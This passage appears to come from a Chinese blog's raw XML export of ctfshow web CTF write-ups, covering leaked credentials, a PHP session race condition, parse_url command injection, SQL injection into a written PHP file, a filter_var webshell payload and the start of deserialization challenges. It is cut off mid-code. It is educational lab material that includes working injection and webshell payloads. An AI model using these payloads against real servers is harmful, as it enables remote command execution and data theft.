<p>提示:有时候网站上的公开信息，就是管理员常用密码</p>
<p>主要考察收集信息和大胆猜测的能力</p>
<p>Robots.txt</p>
<p>/admin/</p>
<p>User:admin</p>
<p>Passwd:372619038(在页面的最下面)</p>
<p>ctfshow{5fae3c78-7d0c-4749-ba24-fa0a6bbe9cdd}</p>
<h1>Web13</h1>
<p>提示;技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>
<p>页面下面的document点进去出现账号密码和url</p>
<p>ctfshow{eb6944f6-439f-40a9-bdb2-1b15750377d8}</p>
<h1>Web14</h1>
<p>提示:有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p>
<p>我们看源码，搜索editor发现是一个图片，再通过wp进入了editor</p>
<p>联想到：页面的设计编辑当中出现的图片是通过一个画图工具显示的，那么这个画图工具一定可以查看当前所有目录。</p>
<p>那么，我们就把flag所在的目录搞到url就可以</p>
<p>Wp说的原理</p>
<p><img src="/2025/01/19/web12-20/wps8.jpg" alt="img"></p>
<h1>Web15</h1>
<p>提示：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
<p>这道题我们可以通过utl/admin进入后台，然后账号应该是admin，密码不知道，但是重置密码里面可以重置，但是要重置密码需要作者所居住的城市，我们可以通过页面下面作者的qq邮箱搜索他的qq（25.1.16截至今天已经搜不到了），不过不妨碍做题，是西安，密码重置了之后登录进去</p>
<p>ctfshow{d95e4ba6-fa90-40ee-9835-f68407fb8f9b}</p>
<h1>Web16</h1>
<p>提示：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
<p>PHP探针：php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。输入URL/tz.php 即可打开雅黑PHP探针</p>
<p><img src="/2025/01/19/web12-20/wps9.jpg" alt="img"></p>
<p>点进phpinfo，查看php信息，然后搜索ctf</p>
<p>ctfshow{1b1ba394-e6ac-40fa-a0a2-aec94f57f917}</p>
<h1>Web17</h1>
<p>提示：备份的sql文件会泄露敏感信息</p>
<p>Url/backup.sql</p>
<p>ctfshow{dfca4269-062e-4c5f-9140-3de1758c32a5}</p>
<h1>Web18</h1>
<p>游戏题，太好了，我是傻逼，就喜欢这种题</p>
<p>查看js文件，找目标</p>
<p>if(score&gt;100)</p>
<p>{</p>
<p>var result=window.confirm(“\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b”);</p>
<p>}</p>
<p>复制里边的东西，然后运行</p>
<p><img src="/2025/01/19/web12-20/wps10.jpg" alt="img"></p>
<p>去看看url/110.php</p>
<p>ctfshow{0869ea96-75f4-4b14-87cd-48e8f6d4cce1}</p>
<h1>Web19</h1>
<p>提示：密钥什么的，就不要放在前端了</p>
<p><img src="/2025/01/19/web12-20/wps11.jpg" alt="img"></p>
<p>用hackebar</p>
<p>方法一：Username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</p>
<p>在原来的登录界面不行，因为没有解密啥的（后来知道他是在登录界面又加密了一下，所以要解密一下源码里面的），但是为啥在hackbar的post就可以</p>
<p>方法二：</p>
<p>解码然后在登录界面提交</p>
<p>这是什么解码？复制给ai问ai</p>
<p>解出来是</p>
<p>i_want_a_36d_girl</p>
<p>出题人脑子也纯有冰</p>
<p>ctfshow{c155ec3f-a3e9-44dc-84d6-03cd726e5751}</p>
<h1>Web20</h1>
<p>提示：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p>
<p>url/db/db.mdb下载文件</p>
<p>flag{ctfshow_old_database}</p>
<h1>12-20总结</h1>
<p>1.后台登录界面url/robots.txt</p>
<p>2.尾页documen里面会有账号密码之类的<br>
3.网页图片editor浏览所有文件<br>
4.Php探针，url/tz.php然后就是进去phpinfo<br>
5.sql文件泄露url/backup.sql<br>
6.游戏找js文件<br>
7.密钥类的用hackbar或者自行ai解码</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>web82-86竞争</title>
    <url>/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/</url>
    <content><![CDATA[<h1>web82</h1>
<p>在cookie中设置PHPSESSID（即session 的值）=flag，那么会在服务器上创建一个/tmp/sess_flag文件，对于默认配置，文件内容上传后会被清除，那么我们需要进行环境竞争，在删除之前，对该文件进行文件包含，从而进行命令执行。<br>
首先我们需要编写以下html脚本，进行临时文件上传，上传文件的同时传入一个参数及其值:PHP_SESSION_UPLOAD_PROGRESS=<?php system('ls'); ?>，这样达到<a href="https://so.csdn.net/so/search?q=%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81&amp;spm=1001.2101.3001.7020">恶意代码</a>的上传，进而执行命令。  注：记得修改url为你做题的网址</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://04485255-5dd1-4cb0-a34a-e59b3e194b81.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>文件随便上传一个</p>
<p>发送到i(爆破)</p>
<p>然后在Cookie后面添加PHPSESSID=flag,以生成sess_flag文件</p>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125021609888.png" alt="image-20250125021609888"></p>
<p>?file=/tmp/sess_flag</p>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125020408645.png" alt="image-20250125020408645"></p>
<p>不涉及爆破，需要清除$,点击上边的清除playload位置$</p>
<p>如果无法清除，在最后一行加一个地方，选中空白即可</p>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125020725543.png" alt="image-20250125020725543"></p>
<p>此处设置 null payload 以及 无限重复</p>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125020752186.png" alt="image-20250125020752186"></p>
<p>新建一个资源池，设置线程为30</p>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125020823707.png" alt="image-20250125020823707"></p>
<p>点击开始，在后面点长度，我这是900接近一千的数字，在下面的响应里面有fl0g.php</p>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125021716036.png" alt="image-20250125021716036"></p>
<p>一边上传一边访问文件，由于访问文件比上传快，所以更能成功。</p>
<p>可见长度与其他不同，点击查看回显结果，得到文件名：fl0g.php，更改命令，cat fl0g.php</p>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125022131210.png" alt="image-20250125022131210"></p>
<p>ctfshow{bd8c3428-76be-488f-b256-2caa6491ab85}</p>
<h1>web83</h1>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125022829690.png" alt="image-20250125022829690"></p>
<p>我这web82的保存下来了</p>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125022921448.png" alt="image-20250125022921448"></p>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125022936154.png" alt="image-20250125022936154"></p>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125022950921.png" alt="image-20250125022950921"></p>
<h1>web84</h1>
<p>直接写最后一步了，虽然源码变了奥，但是还是能拿flag</p>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125023653322.png" alt="image-20250125023653322"></p>
<h1>web85</h1>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125024026566.png" alt="image-20250125024026566"></p>
<h1>web86</h1>
<p><img src="/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/image-20250125025211879.png" alt="image-20250125025211879"></p>
]]></content>
      <tags>
        <tag>web竞争</tag>
      </tags>
  </entry>
  <entry>
    <title>其他</title>
    <url>/2025/04/28/%E5%85%B6%E4%BB%96/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br></pre></td></tr></table></figure>
<h2 id="web396-401">web396~401</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = parse_url($_GET[&#x27;url&#x27;]);</span><br><span class="line">    shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; &#x27;.$url[&#x27;path&#x27;]);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键在shell_exec<br>
其中是一个通过固定的字符串进行拼接的操作,但是在linux当中可以通过分号来进行多命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://1;ls &gt; 1.txt;/path</span><br><span class="line">?url=http://1|ls &gt; 1.txt;/path</span><br><span class="line">?url=http://1/1|cat ./fl0g.php &gt; a.txt</span><br><span class="line">http://`ls`/var/www/html/1.txt</span><br><span class="line">通杀的:</span><br><span class="line">?url=http://1/1;cat ./fl0g.php &gt; a.txt</span><br><span class="line">?url=http://1/1|cat ./fl0g.php &gt; a.txt</span><br></pre></td></tr></table></figure>
<p>接下来直接放源码,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = parse_url($_GET[&#x27;url&#x27;]);</span><br><span class="line">    shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = parse_url($_GET[&#x27;url&#x27;]);</span><br><span class="line">    if(!preg_match(&#x27;/;/&#x27;, $url[&#x27;host&#x27;]))&#123;</span><br><span class="line">        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = parse_url($_GET[&#x27;url&#x27;]);</span><br><span class="line">    if(!preg_match(&#x27;/;|&gt;/&#x27;, $url[&#x27;host&#x27;]))&#123;</span><br><span class="line">        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>web402</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = parse_url($_GET[&#x27;url&#x27;]);</span><br><span class="line">    var_dump($url);</span><br><span class="line">    if(preg_match(&#x27;/http|https/i&#x27;, $url[&#x27;scheme&#x27;]))&#123;</span><br><span class="line">        die(&#x27;error&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!preg_match(&#x27;/;|&gt;|\||base/i&#x27;, $url[&#x27;host&#x27;]))&#123;</span><br><span class="line">        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=ftp://baidu/1;ls &gt; 1.txt</span><br></pre></td></tr></table></figure>
<p>web403</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = parse_url($_GET[&#x27;url&#x27;]);</span><br><span class="line">    if(preg_match(&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;, $url[&#x27;host&#x27;]))&#123;</span><br><span class="line">        shell_exec(&#x27;curl &#x27;.$url[&#x27;scheme&#x27;].$url[&#x27;host&#x27;].$url[&#x27;path&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开头（<code>^</code>）</p>
<p>三组：每组是合法数字+点（<code>.</code>）</p>
<p>最后一组：合法数字（没有点）</p>
<p>结尾（<code>$</code>）</p>
<p><code>(2[0-4]\d|25[0-5]|[01]?\d\d?)</code></p>
<p>这一坨是<strong>单段数字</strong>的匹配规则。它是通过<strong>三种情况组合的</strong>：</p>
<h3 id="拆开解释：">拆开解释：</h3>
<p>(1) <code>2[0-4]\d</code></p>
<ul>
<li>首位是 <code>2</code></li>
<li>第二位是 <code>0-4</code>之间</li>
<li>第三位是任意数字<code>\d</code></li>
</ul>
<p>也就是说，它能匹配：</p>
<ul>
<li><code>200</code> 到 <code>249</code></li>
</ul>
<p>（2开头，第二位是0-4）</p>
<p>比如：</p>
<ul>
<li><code>200</code></li>
<li><code>219</code></li>
<li><code>240</code></li>
<li><code>249</code></li>
</ul>
<hr>
<p>(2) <code>25[0-5]</code></p>
<ul>
<li>首位是 <code>2</code></li>
<li>第二位是 <code>5</code></li>
<li>第三位是 <code>0-5</code></li>
</ul>
<p>所以能匹配：</p>
<ul>
<li><code>250</code></li>
<li><code>251</code></li>
<li><code>252</code></li>
<li><code>253</code></li>
<li><code>254</code></li>
<li><code>255</code></li>
</ul>
<p>（IP地址最大单段就是255）</p>
<hr>
<p>(3) <code>[01]?\d\d?</code></p>
<ul>
<li><code>[01]?</code>：可以有一个0或1，也可以没有（即可选）</li>
<li><code>\d</code>：跟一个数字（0-9）</li>
<li><code>\d?</code>：后面再跟一个数字（也是可选）</li>
</ul>
<p>这实际上覆盖了：</p>
<ul>
<li>0~9 （比如：<code>7</code>）</li>
<li>00~99 （比如：<code>08</code>, <code>99</code>）</li>
<li>100~199（比如：<code>123</code>, <code>199</code>）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://127.0.0.1/path;ls &gt; 1.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;echo `ls` &gt; 1.txt`</span><br></pre></td></tr></table></figure>
<p>最终执行的是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `ls` &gt; 1.txt</span><br></pre></td></tr></table></figure>
<p>含义是：</p>
<ul>
<li><strong>先执行</strong> 反引号里的 <code>ls</code>，得到目录文件名列表，比如 <code>index.php 1.txt</code></li>
<li>然后把结果作为 <code>echo</code> 的内容输出，并且重定向到 <code>1.txt</code></li>
<li>所以 <code>1.txt</code> 里的内容是<strong>一行列出的文件名，用空格分隔</strong></li>
</ul>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php 1.txt</span><br></pre></td></tr></table></figure>
<hr>
<p><code>;ls &gt;1.txt</code></p>
<p>最终执行的是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls &gt; 1.txt</span><br></pre></td></tr></table></figure>
<p>含义是：</p>
<ul>
<li><strong>直接执行</strong> <code>ls</code> 命令，把 <code>ls</code> 的<strong>标准输出</strong>重定向到 <code>1.txt</code></li>
<li><code>ls</code> 的输出是每个文件一个文件名，占一行。</li>
</ul>
<p>比如 <code>1.txt</code> 里面内容是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">1.txt</span><br></pre></td></tr></table></figure>
<p>一行一个文件。</p>
<h2 id="web404">web404</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = parse_url($_GET[&#x27;url&#x27;]);</span><br><span class="line">    if(preg_match(&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;, $url[&#x27;host&#x27;]))&#123;</span><br><span class="line">        if(preg_match(&#x27;/^\/[A-Za-z0-9]+$/&#x27;, $url[&#x27;path&#x27;]))&#123;</span><br><span class="line">            shell_exec(&#x27;curl &#x27;.$url[&#x27;scheme&#x27;].$url[&#x27;host&#x27;].$url[&#x27;path&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://;echo `cat f*` &gt;1.txt;1.1.1.11/1</span><br></pre></td></tr></table></figure>
<p>web405</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = parse_url($_GET[&#x27;url&#x27;]);</span><br><span class="line">    if(preg_match(&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;, $url[&#x27;host&#x27;]))&#123;</span><br><span class="line">        if(preg_match(&#x27;/^\/[A-Za-z0-9]+$/&#x27;, $url[&#x27;path&#x27;]))&#123;</span><br><span class="line">            if(preg_match(&#x27;/\~|\.|php/&#x27;, $url[&#x27;scheme&#x27;]))&#123;</span><br><span class="line">                shell_exec(&#x27;curl &#x27;.$url[&#x27;scheme&#x27;].$url[&#x27;host&#x27;].$url[&#x27;path&#x27;]);</span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo &#x27;parse_url 好强大&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://;echo `cat f*` &gt;1.txt;1.1.1.11/1</span><br></pre></td></tr></table></figure>
<h2 id="web406">web406</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &#x27;config.php&#x27;;</span><br><span class="line">//flag in db</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_GET[&#x27;url&#x27;];</span><br><span class="line">if(filter_var ($url,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $sql = &quot;select * from links where url =&#x27;&#123;$url&#125;&#x27;&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;不通过&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题没有回显<br>
我们可以通过这个sql注入写入文件<br>
可以写马子,或者写其他的东西</p>
<p>传进去一个文件,文件内容用16进制编码一下,毕竟mysql看得懂十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php require &#x27;config.php&#x27;;$sql =&#x27;select flag from flag into outfile &quot;/var/www/html/1.txt&quot;&#x27;;$result = $conn-&gt;query($sql);var_dump($result); ?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=0://www.baidu.com;&#x27;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/&quot;/var/www/html/6.php&quot;%23</span><br></pre></td></tr></table></figure>
<p>先进入6.php然后进入1.txt</p>
<h2 id="web407">web407</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$ip=$_GET[&#x27;ip&#x27;];</span><br><span class="line"></span><br><span class="line">if(filter_var ($ip,FILTER_VALIDATE_IP))&#123;</span><br><span class="line">    call_user_func($ip);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cafe&#123;</span><br><span class="line">    public static function add()&#123;</span><br><span class="line">        echo file_get_contents(&#x27;flag.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>FILTER_VALIDATE_IP是地址过滤器<br>
这里可以通过ipv6来绕过</p>
<p><code>call_user_func('xxx')</code> 本质上就是<strong>动态调用函数或方法</strong></p>
<p><strong>类名 + <code>::</code> + 静态方法名</strong>，叫做<strong>静态方法调用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=cafe::add</span><br></pre></td></tr></table></figure>
<h2 id="web408">web408</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$email=$_GET[&#x27;email&#x27;];</span><br><span class="line"></span><br><span class="line">if(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    file_put_contents(explode(&#x27;@&#x27;, $email)[1], explode(&#x27;@&#x27;, $email)[0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?email=&quot;&lt;?=system($_GET[3])?&gt;&quot;@3.php</span><br></pre></td></tr></table></figure>
<h2 id="web409">web409</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$email=$_GET[&#x27;email&#x27;];</span><br><span class="line">if(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    $email=preg_replace(&#x27;/.flag/&#x27;, &#x27;&#x27;, $email);</span><br><span class="line">    eval($email);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>?</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1>web254</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span 